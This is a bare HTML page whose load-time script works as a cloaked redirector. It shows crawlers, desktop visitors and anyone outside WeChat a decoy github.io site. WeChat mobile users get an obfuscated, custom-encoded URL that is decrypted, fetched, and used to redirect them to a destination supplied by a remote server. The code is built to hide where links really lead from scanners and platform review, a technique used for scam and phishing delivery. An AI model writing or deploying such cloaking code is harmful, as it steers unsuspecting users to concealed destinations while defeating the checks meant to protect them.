<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">

    <meta name="viewport" content="width=device-width, initial-scale=1">

<body>
<script type="text/javascript">
    function getQueryString(name) {
         var reg = new RegExp("(^|&)" + name + "=([^&]*)(&|$)");
         var r = window.location.search.substr(1).match(reg);
         if (r != null) return decodeURI(r[2]);
         return null;
     }

	function str_decrypt(str) {
		str = decodeURIComponent(str);
		var c = String.fromCharCode(str.charCodeAt(0) - str.length);

		for (var i = 1; i < str.length; i++) {
			c += String.fromCharCode(str.charCodeAt(i) - c.charCodeAt(i - 1));
		}
		return c;
	}
    
    function isWeiXin() {
        var ua = window.navigator.userAgent.toLowerCase();
        console.log(ua);
        if (ua.match(/MicroMessenger/i) == 'micromessenger' && ua.indexOf('mpcrawler') == -1) {
            return true;
        } else {
            return false;
        }
    }
    
    function isMobile() {
        var userAgentInfo=navigator.userAgent;
        var Agents =new Array("Android","iPhone","SymbianOS","Windows Phone","iPad","iPod");
        var flag=true;
        for(var v=0;v<Agents.length;v++) {
            if(userAgentInfo.indexOf(Agents[v])>0) {
                flag=false;
                break;
            }
        }
        return flag;
    }
    
   if( !isWeiXin() || isMobile()){
       window.location.href="http://818web.github.io";
    } else{
		var url="%C2%9C%C3%9C%C3%A8%C3%A4%C2%AAi%5E%C2%A6%C3%AE%C3%AE%C2%A5%C2%99%C3%9E%C3%97%C3%8A%C3%8C%C3%8D%C2%95%C2%8F%C3%94%C3%9C%C3%8A%C2%90y%C2%BF%C3%A2%C3%9D%C2%9F%C2%98%C3%97%C3%92%C3%89%C3%9D%C2%A7%C2%96%C3%8C%C3%99%C3%A9%C3%A7%C3%9E%C2%9B%C2%A3%C3%AD%C3%A9%C3%95%C2%94_%5E%C2%96%C3%9C%C3%A1%C3%99"
		var Rurl=str_decrypt(url);
		var httpRequest = new XMLHttpRequest();
        httpRequest.open('GET', Rurl, true);
        httpRequest.send();

        httpRequest.onreadystatechange = function () {
            if (httpRequest.readyState == 4 && httpRequest.status == 200) {
                var urltxt = httpRequest.responseText;
                //console.log(urltxt);
				window.location.href=urltxt;
            }
        };
    }
</script>
